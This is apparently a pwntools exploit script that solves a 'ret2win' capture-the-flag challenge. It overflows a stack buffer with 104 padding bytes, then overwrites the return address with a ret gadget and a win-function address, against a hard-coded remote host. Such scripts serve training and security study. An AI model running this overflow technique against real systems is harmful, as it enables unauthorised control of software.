from pwn import *

# p = process("./ret2win")
p = remote("3.101.12.127", 5000)
ret = 0x000000000040101a
win = 0x00000000040121b
payload = b"a"*104 + p64(ret) + p64(win)
p.recvline()
p.recvline()
p.sendline(payload)
p.interactive()